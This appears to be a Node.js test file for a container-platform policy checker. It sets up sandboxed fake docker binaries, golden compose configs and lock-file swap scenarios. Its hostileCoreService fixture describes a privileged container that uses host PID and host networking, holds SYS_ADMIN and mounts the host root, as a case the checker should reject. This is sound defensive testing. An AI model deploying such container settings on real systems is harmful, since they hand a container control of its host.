#!/usr/bin/env node
import assert from "node:assert/strict";
import crypto from "node:crypto";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { evaluateRuntimeIsolation } from "./runtime-isolation-policy.mjs";
import {
  coreSemanticPolicyDescriptor,
  validateNoHostedCoreAuthority,
} from "./no-hosted-core-policy.mjs";

const source = fs.readFileSync(path.join(import.meta.dirname, "infra-ops.mjs"), "utf8");
const start = source.indexOf("async function runtimeIsolationCheck()");
const end = source.indexOf("\nasync function faultInjectionTests()", start);

assert.notEqual(start, -1, "runtimeIsolationCheck() is missing");
assert.notEqual(end, -1, "runtimeIsolationCheck() boundary is missing");

const runtimeIsolationConsumer = source.slice(start, end);
const composeVpsSource = fs.readFileSync(path.join(import.meta.dirname, "compose-vps.sh"), "utf8");
const repositoryRoot = path.resolve(import.meta.dirname, "..");
const canonicalNoHostedLockPath = path.join(repositoryRoot, "config", "no-hosted-workloads.lock.json");
let fixtureRootDirectory = repositoryRoot;
const protectedKinds = ["configs", "networks", "secrets", "services", "volumes"];
const expectedCoreInventory = {
  configs: ["enterprise_traefik_routes"],
  networks: [
    "enterprise_net",
    "platform_bus",
    "platform_cache",
    "platform_db_admin",
    "platform_docker_control",
    "platform_edge",
    "platform_egress",
    "platform_observability",
    "platform_postgres",
    "platform_routing",
    "platform_storage",
  ],
  secrets: [
    "alertmanager_webhook_token",
    "backup_signing_keys",
    "control_center_database_url",
    "control_center_vault_keys",
    "grafana_admin_password",
    "keycloak_admin_password",
    "keycloak_db_password",
    "mariadb_root_password",
    "minio_root_password",
    "nats_password",
    "phpmyadmin_control_password",
    "postgres_superuser_password",
    "projects_gateway_signing_keys",
    "redis_password",
    "smtp_password",
  ],
  services: [
    "alertmanager",
    "backup-scheduler",
    "cadvisor",
    "control-center",
    "docker-socket-proxy",
    "grafana",
    "keycloak",
    "local-dns",
    "local-registry",
    "loki",
    "mariadb",
    "minio",
    "nats",
    "node-exporter",
    "phpmyadmin",
    "phppgadmin",
    "platform-alert-dispatcher",
    "postgres",
    "project-router",
    "prometheus",
    "promtail",
    "redis",
    "traefik",
    "waf",
  ],
  volumes: [
    "backup_scheduler_logs",
    "enterprise_alertmanager_data",
    "enterprise_grafana_data",
    "enterprise_keycloak_data",
    "enterprise_local_registry_data",
    "enterprise_loki_data",
    "enterprise_mariadb_data",
    "enterprise_minio_data",
    "enterprise_nats_data",
    "enterprise_postgres_data",
    "enterprise_prometheus_data",
    "enterprise_redis_data",
  ],
};

function sha256(value) {
  return crypto.createHash("sha256").update(value).digest("hex");
}

function cleanEnvironment(overrides = {}) {
  const environment = { ...process.env };
  for (const key of [
    "COMPOSE_ENV_FILE",
    "COMPOSE_PROJECT_NAME",
    "DOCKER_CONTEXT",
    "DOCKER_HOST",
    "HOSTED_WORKLOAD_ALLOW_RESOLVED",
    "HOSTED_WORKLOAD_LOCK",
    "HOSTED_WORKLOAD_MODE",
    "HOSTED_WORKLOAD_PREPARE_RESOLVED",
    "HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE",
    "PLATFORM_RUNTIME_CANDIDATE_ID",
    "PLATFORM_RUNTIME_COMMIT",
    "PLATFORM_RUNTIME_DEPLOYMENT_ID",
    "PLATFORM_RUNTIME_SOURCE_RENDER_SHA256",
    "PLATFORM_RUNTIME_TREE",
    "PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256",
    "QA6_ACTIVATION_BUNDLE_FILE",
    "QA6_DOCKER_ENV_CAPTURE",
    "QA6_DOCKER_MARKER",
    "QA6_DOCKER_OUTPUT_FILE",
    "QA6_SWAP_ENV_REPLACEMENT",
    "QA6_SWAP_ENV_TARGET",
    "QA6_SWAP_LOCK_REPLACEMENT",
    "QA6_SWAP_LOCK_TARGET",
  ]) {
    delete environment[key];
  }
  return { ...environment, ...overrides };
}

function writeExecutable(filePath, body) {
  fs.writeFileSync(filePath, body, { mode: 0o755 });
}

function copyRepositoryFile(root, relativePath) {
  const target = path.join(root, relativePath);
  fs.mkdirSync(path.dirname(target), { recursive: true });
  fs.copyFileSync(path.join(repositoryRoot, relativePath), target);
  return target;
}

function createConsumerSandbox() {
  const cleanupRoot =
    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "runtime-consumer-qa6-")));
  const root = path.join(cleanupRoot, "platform-infrastructure");
  fs.mkdirSync(root);
  fs.mkdirSync(path.join(cleanupRoot, "src"));
  fs.mkdirSync(path.join(cleanupRoot, "applications", "example-app"), { recursive: true });
  fixtureRootDirectory = root;
  const scripts = path.join(root, "scripts");
  const configDirectory = path.join(root, "config");
  const fakeBin = path.join(root, "bin");
  fs.mkdirSync(scripts, { recursive: true });
  fs.mkdirSync(configDirectory, { recursive: true });
  fs.mkdirSync(fakeBin, { recursive: true });
  const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
  fs.chmodSync(composeVps, 0o755);
  copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
  copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
  const canonicalLock = copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
  const inventory = structuredClone(expectedCoreInventory);
  const trustedEnvironmentBytes =
    "HOSTED_WORKLOAD_LOCK=\nHOSTED_WORKLOAD_MODE=no-hosted\nCORE_VALUE=trusted\nDOMAIN=fixture.invalid\n";
  const environmentFile = path.join(root, ".env");
  fs.writeFileSync(environmentFile, trustedEnvironmentBytes, { mode: 0o600 });
  fs.writeFileSync(path.join(root, ".env.vps.example"), trustedEnvironmentBytes, { mode: 0o600 });
  const workloadLock = path.join(root, "hosted.lock.json");
  fs.writeFileSync(workloadLock, "{}\n", { mode: 0o600 });
  const activationBundleFile = path.join(root, "activation-bundle.json");
  const dockerOutputFile = path.join(root, "docker-output.json");
  const dockerMarker = path.join(root, "docker-called");
  const dockerEnvironmentCapture = path.join(root, "docker-env.txt");
  const dockerProcessEnvironmentCapture = path.join(root, "docker-process-env.txt");
  writeExecutable(path.join(fakeBin, "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
if [ -f "$sandbox_root/swap-lock-replacement" ]; then
  /bin/mv "$sandbox_root/swap-lock-replacement" "$sandbox_root/config/no-hosted-workloads.lock.json"
  : > "$sandbox_root/lock-swap-fired"
fi
if [ -f "$sandbox_root/swap-env-trigger" ] && [ -f "$sandbox_root/swap-env-replacement" ]; then
  /bin/rm "$sandbox_root/swap-env-trigger"
  /bin/mv "$sandbox_root/swap-env-replacement" "$sandbox_root/.env"
  : > "$sandbox_root/env-swap-fired"
fi
: > "$sandbox_root/docker-called"
/usr/bin/env | /usr/bin/sort > "$sandbox_root/docker-process-env.txt"
expect_env=0
for argument in "$@"; do
  if [ "$expect_env" = 1 ]; then
    /bin/cat "$argument" > "$sandbox_root/docker-env.txt"
    expect_env=0
  elif [ "$argument" = "--env-file" ]; then
    expect_env=1
  fi
done
/bin/cat "$sandbox_root/docker-output.json"
`);
  writeExecutable(path.join(scripts, "hosted-workload-lock.sh"), `#!/bin/sh
set -eu
case "\${2:-}" in
  activation-bundle) /bin/cat "$QA6_ACTIVATION_BUNDLE_FILE" ;;
  verify) exit 0 ;;
  *) exit 64 ;;
esac
`);
  const environment = cleanEnvironment({
    PATH: `${fakeBin}:${process.env.PATH}`,
    COMPOSE_ENV_FILE: environmentFile,
    COMPOSE_PROJECT_NAME: "platform_infra_vps",
    HOSTED_WORKLOAD_LOCK: "",
    HOSTED_WORKLOAD_MODE: "no-hosted",
    HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: "",
    QA6_ACTIVATION_BUNDLE_FILE: activationBundleFile,
  });
  return {
    cleanupRoot,
    root,
    scripts,
    composeVps,
    canonicalLock,
    inventory,
    environmentFile,
    workloadLock,
    activationBundleFile,
    dockerOutputFile,
    dockerMarker,
    dockerEnvironmentCapture,
    dockerProcessEnvironmentCapture,
    environment,
  };
}

function addInfraConsumer(sandbox) {
  for (const relativePath of [
    "scripts/infra-ops.mjs",
    "scripts/network-segmentation-policy.mjs",
    "scripts/runtime-isolation-policy.mjs",
    "scripts/supply-chain-policy.mjs",
    "scripts/functional-health.mjs",
    "scripts/runtime-fingerprint.mjs",
    "scripts/provider-evidence-auth.mjs",
    "scripts/github-governance-policy.mjs",
    "scripts/release-trust.mjs",
    "control-center/backup/contracts.mjs",
  ]) {
    copyRepositoryFile(sandbox.root, relativePath);
  }
  sandbox.infraOps = path.join(sandbox.scripts, "infra-ops.mjs");
  return sandbox;
}

function removeSandbox(sandbox) {
  fs.rmSync(sandbox.cleanupRoot ?? sandbox.root, { recursive: true, force: true });
}

function runWrapper(sandbox, arguments_ = ["runtime-isolation-envelope"], overrides = {}) {
  return spawnSync("/bin/bash", [sandbox.composeVps, ...arguments_], {
    encoding: "utf8",
    env: cleanEnvironment({ ...sandbox.environment, ...overrides }),
  });
}

function runInfraConsumer(sandbox, extraArguments = []) {
  return runInfraArguments(sandbox, [
    "--env-file",
    sandbox.environmentFile,
    ...extraArguments,
  ]);
}

function runInfraArguments(sandbox, arguments_) {
  return spawnSync(process.execPath, [
    "--",
    sandbox.infraOps,
    "runtime-isolation-check",
    ...arguments_,
  ], {
    encoding: "utf8",
    env: cleanEnvironment(sandbox.environment),
  });
}

function boundedService(overrides = {}) {
  return {
    cpus: 0.5,
    cpu_shares: 256,
    mem_limit: 128 * 1024 * 1024,
    memswap_limit: 128 * 1024 * 1024,
    mem_reservation: 32 * 1024 * 1024,
    pids_limit: 128,
    ulimits: { nofile: { soft: 8192, hard: 8192 } },
    blkio_config: { weight: 300 },
    restart: "no",
    healthcheck: { test: ["CMD", "true"] },
    logging: { driver: "json-file", options: { "max-size": "10m", "max-file": "5" } },
    environment: {},
    secrets: [],
    volumes: [],
    networks: {},
    read_only: true,
    security_opt: ["no-new-privileges:true"],
    ...overrides,
  };
}

function coreRuntimeConfig(inventory, { hosted = false } = {}) {
  const fromNames = (names, definition) =>
    Object.fromEntries(names.map((name) => [name, definition(name)]));
  const physicalNetworkName = (name) => {
    if (name === "enterprise_net") return "enterprise_net";
    if (name === "platform_docker_control") return "platform_infra_vps_platform_docker_control";
    return `platform_infra_vps_${name.slice("platform_".length)}`;
  };
  const config = {
    name: "platform_infra_vps",
    configs: fromNames(inventory.configs, (name) => ({
      content: coreSemanticPolicyDescriptor.configContentLines[name]
        .join("\n")
        .replace("__PORTAL_HOST__", "portal.fixture.invalid")
        .replace("__DOCS_HOST__", "docs.fixture.invalid")
        .replace("__AUTH_HOST__", "auth.fixture.invalid"),
    })),
    networks: fromNames(inventory.networks, (name) => ({
      name: coreSemanticPolicyDescriptor.physicalNetworkNames[name],
      ...(Object.keys(coreSemanticPolicyDescriptor.networkLabels[name]).length > 0
        ? { labels: structuredClone(coreSemanticPolicyDescriptor.networkLabels[name]) }
        : {}),
      ...(name === "enterprise_net" ? { external: true } : {}),
      ...(name !== "enterprise_net" && name !== "platform_egress" ? { internal: true } : {}),
      ...(name === "platform_egress" ? { enable_ipv6: false } : {}),
      ...(name === "platform_docker_control" ? { driver: "bridge" } : {}),
    })),
    secrets: fromNames(inventory.secrets, (name) => ({
      file: path.join(fixtureRootDirectory, coreSemanticPolicyDescriptor.secretFiles[name]),
    })),
    services: fromNames(inventory.services, () => boundedService()),
    volumes: fromNames(inventory.volumes, (name) => ({
      name: coreSemanticPolicyDescriptor.physicalVolumeNames[name],
      ...(coreSemanticPolicyDescriptor.externalVolumeNames.includes(name) ? { external: true } : {}),
    })),
  };
  config.services["control-center"] = boundedService({ read_only: true, cpu_shares: 1024 });
  config.services["project-router"] = boundedService({
    volumes: [
      { type: "bind", source: "/srv/apps", target: "/var/www/projects", read_only: true },
      { type: "bind", source: "/srv/state", target: "/var/www/project-state", read_only: true },
    ],
  });
  config.services["platform-alert-dispatcher"] = boundedService();
  config.services["backup-scheduler"] = boundedService({
    cpu_shares: 1024,
    environment: {
      DOCKER_HOST: "tcp://docker-socket-proxy:2375",
      DOCKER_API_VERSION: "1.51",
    },
    networks: { platform_docker_control: null },
  });
  config.services["docker-socket-proxy"] = boundedService({
    cpu_shares: 1024,
    image: `ghcr.io/tecnativa/docker-socket-proxy:v0.4.2@sha256:${"a".repeat(64)}`,
    environment: Object.fromEntries(
      ["AUTH", "BUILD", "COMMIT", "CONFIGS", "SECRETS", "SERVICES", "SESSION", "SWARM", "SYSTEM", "TASKS"]
        .map((key) => [key, "0"]),
    ),
    ports: [{ host_ip: "127.0.0.1", published: "2376", target: 2375, protocol: "tcp" }],
    volumes: [{ type: "bind", source: "/var/run/docker.sock", target: "/var/run/docker.sock", read_only: true }],
    networks: { platform_docker_control: null },
  });
  config.services.postgres = boundedService();
  for (const serviceName of inventory.services) {
    const service = config.services[serviceName];
    const processModel = coreSemanticPolicyDescriptor.serviceProcessModel[serviceName];
    service.container_name = coreSemanticPolicyDescriptor.serviceContainerNames[serviceName];
    service.restart = coreSemanticPolicyDescriptor.serviceRestartPolicies[serviceName];
    if (coreSemanticPolicyDescriptor.serviceProfiles[serviceName]) {
      service.profiles = [...coreSemanticPolicyDescriptor.serviceProfiles[serviceName]];
    }
    if (coreSemanticPolicyDescriptor.exactExceptions.pid[serviceName]) {
      service.pid = coreSemanticPolicyDescriptor.exactExceptions.pid[serviceName];
    }
    if (coreSemanticPolicyDescriptor.exactExceptions.networkMode[serviceName]) {
      service.network_mode =
        coreSemanticPolicyDescriptor.exactExceptions.networkMode[serviceName];
    }
    const dependencies = coreSemanticPolicyDescriptor.serviceDependencies[serviceName] ?? [];
    if (dependencies.length > 0) {
      service.depends_on = Object.fromEntries(
        dependencies.map((dependency) => [
          dependency,
          { condition: "service_healthy", required: true, restart: false },
        ]),
      );
    }
    service.healthcheck =
      structuredClone(coreSemanticPolicyDescriptor.serviceHealthchecks[serviceName]);
    if (!coreSemanticPolicyDescriptor.servicesWithDefaultLogging.includes(serviceName)) {
      delete service.logging;
    }
    if (processModel.command !== null) service.command = structuredClone(processModel.command);
    if (processModel.entrypoint !== null) service.entrypoint = structuredClone(processModel.entrypoint);
    service.networks = Object.fromEntries(
      coreSemanticPolicyDescriptor.serviceNetworks[serviceName].map((name) => [name, null]),
    );
    service.secrets = [...(coreSemanticPolicyDescriptor.serviceSecretGrants[serviceName] ?? [])];
    service.configs = structuredClone(coreSemanticPolicyDescriptor.serviceConfigGrants[serviceName] ?? []);
    service.ports = (coreSemanticPolicyDescriptor.servicePortRules[serviceName] ?? []).map((port) => ({
      host_ip: port.hostIp,
      protocol: port.protocol,
      published: String(port.published),
      target: port.target,
    }));
    if (coreSemanticPolicyDescriptor.tmpfsRules[serviceName]) {
      service.tmpfs = [...coreSemanticPolicyDescriptor.tmpfsRules[serviceName]];
    }
    if (serviceName === "alertmanager") service.group_add = ["1000"];
    if (coreSemanticPolicyDescriptor.requiredServiceControls.capDropAll.includes(serviceName)) {
      service.cap_drop = ["ALL"];
    }
    if (coreSemanticPolicyDescriptor.requiredServiceControls.numericUsers[serviceName]) {
      service.user = coreSemanticPolicyDescriptor.requiredServiceControls.numericUsers[serviceName];
    }
    service.image = coreSemanticPolicyDescriptor.serviceImages[serviceName];
    const dockerfile = coreSemanticPolicyDescriptor.buildDockerfiles[serviceName];
    if (dockerfile) {
      service.build = {
        context: fixtureRootDirectory,
        dockerfile,
        args: { NODE_IMAGE: coreSemanticPolicyDescriptor.serviceImages["project-router"] },
      };
    }
    if (serviceName === "docker-socket-proxy") {
      service.environment = structuredClone(coreSemanticPolicyDescriptor.proxyEnvironment);
    }
    if (serviceName === "control-center") {
      Object.assign(
        service.environment,
        structuredClone(coreSemanticPolicyDescriptor.controlCenterFixedSecurityEnvironment),
        { CONTROL_CENTER_OIDC_ISSUER: "https://auth.fixture.invalid/realms/platform" },
      );
    }
    if (serviceName === "waf") {
      service.environment = {
        ...service.environment,
        ...structuredClone(coreSemanticPolicyDescriptor.wafFixedSecurityEnvironment),
        ...Object.fromEntries(
          Object.entries(coreSemanticPolicyDescriptor.wafProjectedSecurityEnvironment)
            .map(([key, projection]) => [key, projection.fallback]),
        ),
      };
    }
    if (serviceName === "backup-scheduler") {
      Object.assign(
        service.environment,
        Object.fromEntries(
          Object.entries(coreSemanticPolicyDescriptor.backupSchedulerBooleanEnvironment)
            .map(([key, projection]) => [key, projection.fallback]),
        ),
      );
    }
    service.volumes = [];
    for (const [target, mode] of Object.entries(
      coreSemanticPolicyDescriptor.bindTargets[serviceName] ?? {},
    )) {
      const [rule] = coreSemanticPolicyDescriptor.bindSourceRules[serviceName][target];
      const source = rule.startsWith("root:")
        ? path.resolve(fixtureRootDirectory, rule.slice("root:".length))
        : path.resolve(fixtureRootDirectory, "../src");
      service.volumes.push({
        type: "bind",
        source,
        target,
        read_only: mode === "read-only",
      });
    }
    for (const [candidateService, source, target, mode] of
      coreSemanticPolicyDescriptor.hostBindExceptions) {
      if (candidateService === serviceName) {
        service.volumes.push({
          type: "bind",
          source,
          target,
          read_only: mode === "read-only",
        });
      }
    }
    for (const [source, target] of Object.entries(
      coreSemanticPolicyDescriptor.namedVolumeTargets[serviceName] ?? {},
    )) {
      service.volumes.push({ type: "volume", source, target });
    }
  }
  if (hosted) {
    config.services["example-app-web"] = boundedService({
      image: `example.invalid/example-app@sha256:${"a".repeat(64)}`,
      user: "1000:1000",
      init: true,
      logging: { driver: "local", options: { "max-size": "10m", "max-file": "3" } },
      security_opt: ["no-new-privileges:true"],
      cap_drop: ["ALL"],
      labels: {
        "com.platform.workload-id": "example-app",
        "com.platform.workload-role": "web",
      },
      networks: { example_app_ingress: null },
    });
    config.networks.example_app_ingress = {
      internal: true,
      name: "platform_infra_vps_example_app_ingress",
    };
  }
  return config;
}

function hostileCoreService(overrides = {}) {
  return boundedService({
    image: `attacker.invalid/hostile@sha256:${"f".repeat(64)}`,
    privileged: true,
    pid: "host",
    network_mode: "host",
    cap_add: ["SYS_ADMIN"],
    devices: ["/dev/null:/dev/qa7"],
    volumes: [{ type: "bind", source: "/", target: "/host" }],
    ...overrides,
  });
}

function coreAuthorityConfig() {
  const config = coreRuntimeConfig(expectedCoreInventory);
  for (const [serviceName, definition] of Object.entries(config.services)) {
    definition.image ||= `trusted.invalid/${serviceName}@sha256:${sha256(serviceName)}`;
  }
  return config;
}

function writeDockerOutput(sandbox, documents) {
  fs.writeFileSync(sandbox.dockerOutputFile, documents);
}

const qa8GoldenParserPath = path.join(
  import.meta.dirname,
  "fixtures",
  "hosted-golden-parser.rb",
);
let qa8RepositoryGoldenTemplate;

function qa8EnvironmentObject(sandbox) {
  return {
    COMPOSE_PROJECT_NAME: "platform_infra_vps",
    DOMAIN: "fixture.invalid",
    PHP_PROJECTS_DIR: "../compose-source",
    PROJECT_SOURCE_DIR: "../compose-source",
    HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: sandbox.canonicalLock,
    ALERT_EMAIL_TO: "qa@fixture.invalid",
    MAILER_FROM: "qa@fixture.invalid",
    MAILER_REPLY_TO: "qa@fixture.invalid",
    SMTP_HOST: "smtp.fixture.invalid",
    SMTP_USER: "qa",
  };
}

function qa8EnvironmentMap(sandbox) {
  return new Map(Object.entries(qa8EnvironmentObject(sandbox)));
}

function installQa8Environment(sandbox) {
  const values = qa8EnvironmentObject(sandbox);
  const bytes = [
    "HOSTED_WORKLOAD_LOCK=",
    "HOSTED_WORKLOAD_MODE=no-hosted",
    ...Object.entries(values).map(([key, value]) => `${key}=${value}`),
    "",
  ].join("\n");
  fs.mkdirSync(path.join(sandbox.cleanupRoot, "compose-source"), { recursive: true });
  fs.writeFileSync(sandbox.environmentFile, bytes, { mode: 0o600 });
  fs.writeFileSync(path.join(sandbox.root, ".env.vps.example"), bytes, { mode: 0o600 });
  Object.assign(sandbox.environment, {
    COMPOSE_PROJECT_NAME: values.COMPOSE_PROJECT_NAME,
    HOSTED_WORKLOAD_LOCK: "",
    HOSTED_WORKLOAD_MODE: "no-hosted",
    HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: "",
  });
  return qa8EnvironmentMap(sandbox);
}

function qa8RepositoryGolden() {
  if (qa8RepositoryGoldenTemplate !== undefined) {
    return structuredClone(qa8RepositoryGoldenTemplate);
  }
  const outputDirectory =
    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "hosted-golden-qa8-")));
  const outputPath = path.join(outputDirectory, "golden.json");
  try {
    const result = spawnSync("/usr/bin/ruby", [qa8GoldenParserPath], {
      encoding: "utf8",
      env: cleanEnvironment({
        ROOT: repositoryRoot,
        GOLDEN_OUT: outputPath,
      }),
    });
    assert.equal(
      result.status,
      0,
      `independent nine-overlay parser failed:\n${result.stderr}`,
    );
    qa8RepositoryGoldenTemplate = JSON.parse(fs.readFileSync(outputPath, "utf8"));
    return structuredClone(qa8RepositoryGoldenTemplate);
  } finally {
    fs.rmSync(outputDirectory, { recursive: true, force: true });
  }
}

function rewriteQa8GoldenPaths(value, sandbox) {
  if (Array.isArray(value)) {
    return value.map((entry) => rewriteQa8GoldenPaths(entry, sandbox));
  }
  if (value !== null && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value)
        .map(([key, entry]) => [key, rewriteQa8GoldenPaths(entry, sandbox)]),
    );
  }
  if (typeof value !== "string") return value;
  const repositorySource = path.resolve(repositoryRoot, "../compose-source");
  const sandboxSource = path.join(sandbox.cleanupRoot, "compose-source");
  if (value === repositorySource || value.startsWith(`${repositorySource}${path.sep}`)) {
    return `${sandboxSource}${value.slice(repositorySource.length)}`;
  }
  if (value === repositoryRoot || value.startsWith(`${repositoryRoot}${path.sep}`)) {
    return `${sandbox.root}${value.slice(repositoryRoot.length)}`;
  }
  return value;
}

function qa8IndependentGolden(sandbox) {
  return rewriteQa8GoldenPaths(qa8RepositoryGolden(), sandbox);
}

function qa8LegacyCompatibleGolden(sandbox) {
  const config = qa8IndependentGolden(sandbox);
  config.services.nats.entrypoint = [
    "/bin/sh",
    "-ec",
    'NATS_PASSWORD="$$(cat "$$NATS_PASSWORD_FILE")"; '
      + 'exec nats-server -c /etc/nats/nats-server.conf '
      + '--user "$$NATS_USER" --pass "$$NATS_PASSWORD"\n',
  ];
  config.services.phpmyadmin.restart = "no";
  config.services.phppgadmin.restart = "no";
  config.services["platform-alert-dispatcher"].volumes = [];
  return config;
}

function qa8KnownCompatibilityViolations(violations) {
  const joined = violations.join("\n");
  return [
    /nats:(?:process-model|entrypoint)/i,
    /phpmyadmin:restart/i,
    /phppgadmin:restart/i,
    /platform-alert-dispatcher:(?:mount-inventory|volumes)/i,
  ].every((pattern) => pattern.test(joined));
}

function selectQa8AcceptedBaseline(sandbox, lock, environment) {
  const candidateDefinitions = [
    ["independent", qa8IndependentGolden(sandbox)],
    ["legacy-compatible", qa8LegacyCompatibleGolden(sandbox)],
  ];
  materializeQa8CanonicalSources(sandbox, candidateDefinitions[0][1]);
  const candidates = candidateDefinitions.map(([label, config]) => ({
    label,
    config,
    violations: validateNoHostedCoreAuthority(
      lock,
      config,
      sandbox.root,
      environment,
    ),
  }));
  const accepted = candidates.filter(({ violations }) => violations.length === 0);
  assert.equal(
    accepted.length,
    1,
    `expected exactly one accepted golden variant: ${JSON.stringify(
      candidates.map(({ label, violations }) => ({ label, violations })),
    )}`,
  );
  const rejected = candidates.find(({ violations }) => violations.length !== 0);
  assert.ok(rejected, "the non-authoritative compatibility variant was unexpectedly absent");
  assert.equal(
    rejected.violations.length,
    4,
    `compatibility delta is not the exact four-field transition: ${rejected.violations.join(",")}`,
  );
  assert.equal(
    qa8KnownCompatibilityViolations(rejected.violations),
    true,
    `compatibility delta failed outside the four known fields: ${rejected.violations.join(",")}`,
  );
  return accepted[0];
}

const qa8DirectoryMountTargets = new Set([
  "/app",
  "/docker-entrypoint-initdb.d",
  "/etc/coredns",
  "/etc/grafana/provisioning",
  "/etc/mysql/conf.d",
  "/etc/mysql/ssl",
  "/etc/phpmyadmin/certs",
  "/infra",
  "/infra/backups",
  "/infra/reports",
  "/loki/rules",
  "/opt/keycloak/data/import",
  "/platform-postgres-init",
  "/project",
  "/var/lib/grafana/dashboards",
  "/var/lib/node-exporter/textfile",
  "/var/www/infra-docs",
  "/var/www/project-state",
  "/var/www/projects",
  "/etc/prometheus/rules",
]);

function materializeQa8CanonicalSources(sandbox, config) {
  fs.mkdirSync(path.join(sandbox.cleanupRoot, "compose-source"), {
    recursive: true,
    mode: 0o755,
  });
  for (const [secretName, definition] of Object.entries(config.secrets ?? {})) {
    assert.equal(typeof definition?.file, "string", `missing ${secretName} secret path`);
    fs.mkdirSync(path.dirname(definition.file), { recursive: true, mode: 0o755 });
    fs.writeFileSync(definition.file, `qa8-${secretName}\n`, {
      mode: secretName === "alertmanager_webhook_token" ? 0o640 : 0o600,
    });
  }
  for (const service of Object.values(config.services ?? {})) {
    for (const mount of service.volumes ?? []) {
      if (mount?.type !== "bind" || typeof mount.source !== "string") continue;
      const inRoot =
        mount.source === sandbox.root || mount.source.startsWith(`${sandbox.root}${path.sep}`);
      const siblingSource = path.join(sandbox.cleanupRoot, "compose-source");
      const inSibling =
        mount.source === siblingSource || mount.source.startsWith(`${siblingSource}${path.sep}`);
      if (!inRoot && !inSibling) continue;
      if (mount.source === sandbox.root || qa8DirectoryMountTargets.has(mount.target)) {
        fs.mkdirSync(mount.source, { recursive: true, mode: 0o755 });
        continue;
      }
      fs.mkdirSync(path.dirname(mount.source), { recursive: true, mode: 0o755 });
      const repositoryPath = inRoot
        ? `${repositoryRoot}${mount.source.slice(sandbox.root.length)}`
        : `${path.resolve(repositoryRoot, "../compose-source")}${
          mount.source.slice(siblingSource.length)
        }`;
      if (fs.existsSync(repositoryPath) && fs.lstatSync(repositoryPath).isFile()) {
        fs.copyFileSync(repositoryPath, mount.source);
      } else {
        fs.writeFileSync(mount.source, `qa8-source:${mount.target}\n`, { mode: 0o644 });
      }
      fs.chmodSync(
        mount.source,
        mount.target === "/usr/local/bin/platform-postgres-entrypoint" ? 0o755 : 0o644,
      );
    }
  }
}

function installCountingRenderer(sandbox) {
  const renderCountFile = path.join(sandbox.root, "docker-render-count");
  fs.writeFileSync(renderCountFile, "0\n", { mode: 0o600 });
  writeExecutable(path.join(sandbox.root, "bin", "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
render_count_file="$sandbox_root/docker-render-count"
count=0
if [ -f "$render_count_file" ]; then
  IFS= read -r count < "$render_count_file"
fi
count=$((count + 1))
printf '%s\\n' "$count" > "$render_count_file"
/bin/cat "$sandbox_root/docker-output.json"
`);
  return {
    count() {
      return Number.parseInt(fs.readFileSync(renderCountFile, "utf8").trim(), 10);
    },
    reset() {
      fs.writeFileSync(renderCountFile, "0\n", { mode: 0o600 });
    },
  };
}

function runCoreStackNoHostedScenario(config, { materializeSources = false } = {}) {
  const cleanupRoot =
    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "core-stack-no-hosted-qa7-")));
  const root = path.join(cleanupRoot, "platform-infrastructure");
  fs.mkdirSync(root);
  fs.mkdirSync(path.join(cleanupRoot, "src"));
  config = structuredClone(config);
  for (const secretName of Object.keys(config.secrets)) {
    config.secrets[secretName] = {
      file: path.join(root, coreSemanticPolicyDescriptor.secretFiles[secretName]),
    };
  }
  for (const [serviceName, service] of Object.entries(config.services)) {
    if (service.build) service.build.context = root;
    for (const mount of service.volumes ?? []) {
      const rules = coreSemanticPolicyDescriptor.bindSourceRules[serviceName]?.[mount.target];
      if (!rules || rules.length !== 1) continue;
      const [rule] = rules;
      mount.source = rule.startsWith("root:")
        ? path.resolve(root, rule.slice("root:".length))
        : path.resolve(root, "../compose-source");
    }
  }
  const fakeBin = path.join(root, "bin");
  const stateDirectory = path.join(root, "state");
  fs.mkdirSync(fakeBin);
  fs.mkdirSync(stateDirectory);
  const gate = copyRepositoryFile(root, "scripts/core-stack-activation-gate.sh");
  const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
  copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
  copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
  copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
  fs.chmodSync(gate, 0o755);
  fs.chmodSync(composeVps, 0o755);

  const modelPath = path.join(root, "candidate-render.json");
  fs.writeFileSync(modelPath, `${JSON.stringify(config)}\n`, { mode: 0o600 });
  const extensionServices = new Set([
    "project-router", "postgres", "redis", "nats", "keycloak", "minio", "prometheus",
  ]);
  const mutableServices = Object.keys(config.services)
    .filter((serviceName) => !extensionServices.has(serviceName))
    .sort();
  const idsPath = path.join(root, "container-ids");
  fs.writeFileSync(idsPath, `${mutableServices.map((serviceName) => `cid-${serviceName}`).join("\n")}\n`);
  const inspections = mutableServices.map((serviceName) => ({
    Config: {
      Labels: {
        "com.docker.compose.project": "platform_infra_vps",
        "com.docker.compose.service": serviceName,
      },
      Image: config.services[serviceName].image,
    },
    State: { Running: true },
  }));
  const inspectPath = path.join(root, "inspect.json");
  fs.writeFileSync(inspectPath, `${JSON.stringify(inspections)}\n`, { mode: 0o600 });

  writeExecutable(path.join(root, "scripts", "platform-activation-state.mjs"), `#!/usr/bin/env node
const expected = ["read", process.env.PLATFORM_ACTIVATION_STATE_DIR, "journal.json"];
if (JSON.stringify(process.argv.slice(2)) !== JSON.stringify(expected)) process.exit(64);
process.stdout.write(JSON.stringify({
  version: 2,
  state: "pending",
  transactionId: process.env.PLATFORM_ACTIVATION_TRANSACTION_ID,
  projectName: "platform_infra_vps",
  phase: "intent"
}));
`);
  writeExecutable(path.join(fakeBin, "timeout"), `#!/bin/sh
set -eu
shift
exec "$@"
`);
